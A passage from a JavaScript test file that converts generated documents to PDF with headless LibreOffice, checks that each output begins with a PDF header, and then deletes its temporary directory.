      const r = spawnSync('soffice', ['--headless', `-env:UserInstallation=file://${join(d, 'profil')}`, '--convert-to', 'pdf', '--outdir', d, join(d, f)], { encoding: 'utf8', timeout: 120_000 });
      const pdf = join(d, f.replace(/\.\w+$/, '.pdf'));
      assert.ok(existsSync(pdf) && readFileSync(pdf).subarray(0, 5).toString() === '%PDF-', `LibreOffice n'a pas ouvert ${f} : ${r.stderr || r.stdout}`);
    }
  } finally { rmSync(d, { recursive: true, force: true }); }
});
